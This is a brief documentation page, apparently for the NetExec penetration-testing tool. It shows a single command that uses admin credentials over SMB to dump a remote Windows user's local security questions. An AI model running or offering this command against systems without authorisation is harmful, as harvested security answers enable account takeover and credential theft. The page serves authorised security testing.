# Dump User Local Security Questions

{% hint style="warning" %}
You need at least local admin privilege on the remote target
{% endhint %}

New NetExec module to dump a local user's security questions if they have them.

```bash
nxc smb $TARGET -u $USER -p $PASSWORD -M security-questions
```
